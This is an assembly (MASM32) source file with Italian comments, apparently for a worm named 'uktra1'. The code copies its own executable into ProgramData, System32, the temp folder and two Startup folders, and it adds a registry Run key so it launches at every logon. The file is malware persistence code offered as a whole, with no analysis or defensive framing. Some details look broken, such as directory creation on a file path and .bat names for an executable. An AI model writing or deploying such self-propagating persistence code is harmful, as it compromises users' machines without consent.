include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.data
    src db 260 dup(0)              ; Buffer per il percorso del file corrente
    dst1 db "C:\ProgramData\uktra1_Worm\uktra1.bat", 0
    dst2 db "C:\Windows\System32\uktra1.bat", 0
    dst3 db "%TEMP%\uktra1.bat", 0
    startup1 db "C:\Users\Public\Start Menu\Programs\Startup\uktra1.bat", 0
    startup2 db "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\uktra1.bat", 0
    regPath db "Software\Microsoft\Windows\CurrentVersion\Run", 0
    regName db "Uktra1", 0
    regCmd db "C:\ProgramData\uktra1_Worm\uktra1.bat", 0
    regKey HKEY_CURRENT_USER
    msg db "Operation Complete", 0

.code
start:
    ; Ottieni il percorso del file eseguibile corrente (il file batch)
    invoke GetModuleFileName, NULL, addr src, 260

    ; Crea la directory nel percorso 'dst1' se non esiste e copia il file in 'dst1'
    invoke CreateDirectory, addr dst1, NULL
    invoke CopyFile, addr src, addr dst1, FALSE

    ; Copia il file batch nelle directory critiche
    invoke CopyFile, addr src, addr dst2, FALSE
    invoke CopyFile, addr src, addr dst3, FALSE

    ; Copia il file batch nelle cartelle di avvio automatico
    invoke CopyFile, addr src, addr startup1, FALSE
    invoke CopyFile, addr src, addr startup2, FALSE

    ; Imposta l'avvio automatico tramite il registro di sistema
    invoke RegOpenKeyEx, HKEY_CURRENT_USER, addr regPath, 0, KEY_WRITE, addr regKey
    invoke RegSetValueEx, regKey, addr regName, 0, REG_SZ, addr regCmd, sizeof regCmd
    invoke RegCloseKey, regKey

    ; Mostra un messaggio per confermare il completamento (opzionale)
    invoke MessageBox, NULL, addr msg, addr msg, MB_OK

    ; Esci dal processo
    invoke ExitProcess, 0
end start

